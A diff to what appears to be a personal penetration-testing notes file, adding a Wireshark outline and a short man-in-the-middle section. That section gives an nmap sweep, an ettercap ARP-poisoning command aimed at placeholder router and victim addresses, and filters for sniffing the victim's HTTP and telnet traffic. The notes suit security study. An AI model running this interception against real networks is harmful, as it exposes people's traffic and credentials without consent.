@@ -98,6 +98,80 @@ http.proxy on
 ## [BeEF](https://beefproject.com/)
 - The Browser Exploitation Framework used for penetration testing web browsers
 
+## [Wireshark](https://www.wireshark.org/)
+
+- Packet Analyzer / Network Traffic Analyzer
+    - Live Capture
+    - Import & Export capture files
+        - `.pcap` (packet capture)
+            - Analyzers
+                - A-Packets (Note: Uploads files to a public repo)
+        - `.pcapng` (additional metadata)
+    - Troubleshoot, examine, debug and learn
+- Alternatives: `tshark` (Wireshark CLI), `tcpdump`
+- Architecture
+    - `NIC` &rarr; `PCAP` &rarr; `GUI/CLI` &rarr; `User`
+- Drivers
+    - Linux: `libpcap`
+    - Windows: `winpcap`
+    - Core Engine: `dumpcap`
+- Customize Settings
+    - Security Profile
+    - Statistics
+    - Configure GeoIP
+    - Custom COlumns
+    - Name Resolution
+    - Export Objects in HTTP or from other protocols
+- Detecting Usual and Unusual traffic
+    - DNS, HTTP
+    - Analyze traffic from unwanted countries
+    - Filtering the suspect behavior
+    - Filter the executable files
+    - Analyze traffic over non-standard ports
+- GUI
+    - Customization
+        - Create new profile like `Network Forensics`
+        - Change `Time` column to display `UTC` and in `Milliseconds`
+        - Add columns for `Source Port` and `Destination Port`
+        - Add `Coloring Rules` from `View` menu and also give priority for these rules
+    - Filters
+        - Attackers encrypts traffic via `DNS` and `HTTPS`
+        - DNS: Filter `Answer RRs` (Resource Records) for suspicious packets
+        - TCP filters: 
+            - SYN packets: `tcp.flags.syn == 1`
+    - Statistics
+        - Capture File Properties
+        - Protocol Hierarchy: gives an attacker's network process and high-level target overview
+        - Endpoints and Conversations
+    - GeoIP
+        - Pull endpoint information like country, city, etc.
+        - Add GeoIP database: `Edit` &rarr; `Preferences` &rarr; `Name Resolution` &rarr; `MaxMind database directories`
+
+## MITM Attack / Sniffing Network Traffic
+
+### Tools Required
+- Wireshark
+- nmap
+- Ettercap
+
+Network Scanning
+```
+sudo nmap -sn <subnet>
+```
+ARP Poisoning (Changing the destination MAC address on Router & Victim to put yourself in between them)
+```
+sudo ettercap -T -S -i wlan0 -M arp:remote /<Router-IP>// /<Victim-IP>// 
+```
+- `-T` : Text-only (not GUI)
+- `-S` : not to use SSL
+- `-i` : Interface
+- `-M` : MITM
+
+Sniffing with Wireshark
+- Filters
+    - `ip.addr == <Victim-IP> && http`
+    - `ip.addr == <Victim-IP> && telnet`
+
 ## Hacking WiFi passwords
 
 1. Handshake Capture
@@ -148,6 +222,7 @@ GCP gpus to crack passwords
 
 #### References
 YouTube
+- [how Hackers SNiFF (capture) network traffic // MiTM attack](https://www.youtube.com/watch?v=-rSqbgI7oZM)
 - [hacking every device on wifi / ethernet networks 1 #wifi #hack #MITM](https://www.youtube.com/watch?v=2J3idGxCbuc)
 - [hacking every device on wifi / ethernet networks 2 #wifi #hack #MITM #javascript](https://www.youtube.com/watch?v=ExxxhioK1Hk)
 - [3 wifi attacks and speed hash cracking with cloud GPUs](https://www.youtube.com/watch?v=MrWAJEQJZbk)
